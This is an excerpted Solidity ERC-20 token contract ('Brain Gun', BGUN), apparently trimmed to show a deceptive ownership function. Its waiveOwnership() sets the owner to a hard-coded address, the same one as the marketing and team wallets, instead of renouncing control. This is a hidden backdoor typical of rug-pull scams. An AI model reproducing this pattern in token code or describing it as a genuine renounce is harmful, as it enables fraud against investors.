...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x2f231CAc81d12FCc653E4cD2dF9A5764A2B3d61A);
    }
...
contract BrainGun is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Brain Gun";
    string private _symbol = "BGUN";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x2f231CAc81d12FCc653E4cD2dF9A5764A2B3d61A);
    address payable private teamWalletAddress = payable(0x2f231CAc81d12FCc653E4cD2dF9A5764A2B3d61A);
